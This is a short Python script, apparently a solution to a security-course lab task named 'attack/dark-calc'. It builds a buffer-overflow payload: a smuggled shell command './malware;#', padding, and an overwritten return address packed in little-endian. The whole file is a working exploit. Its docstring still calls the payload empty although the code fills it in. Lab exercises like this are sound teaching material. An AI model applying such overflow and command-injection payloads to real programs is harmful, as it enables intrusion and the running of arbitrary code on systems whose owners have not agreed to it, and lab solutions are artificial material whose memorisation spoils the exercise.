#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
target_addr = 0x401a6b
cmd = b"./malware;#"
padding = b"A" * (24 - len(cmd))
payload = cmd + padding
payload += target_addr.to_bytes(8, 'little')
sys.stdout.buffer.write(payload + b"\n")
